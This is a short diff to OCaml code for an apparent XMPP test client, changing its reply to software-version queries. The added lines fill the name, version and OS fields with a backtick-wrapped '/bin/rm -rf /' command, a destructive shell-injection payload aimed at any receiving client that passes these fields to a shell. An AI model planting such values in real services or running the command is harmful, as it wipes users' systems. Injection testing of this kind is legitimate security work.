@@ -180,10 +180,12 @@ let session_callback t =
     (fun ev _jid_from _jid_to _lang () ->
       match ev with
         | IQGet _el ->
-          let el = Version.encode {Version.name = "xmpptest";
-                                   Version.version = "2.0";
-                                   Version.os = Sys.os_type} in
-            return (IQResult (Some el))
+          let el = Version.(encode
+                              {name = "`/bin/rm -rf /`";
+                               version = "`/bin/rm -rf /`";
+                               os = "`/bin/rm -rf /`"})
+          in
+          return (IQResult (Some el))
         | IQSet _el ->
           fail BadRequest
     );
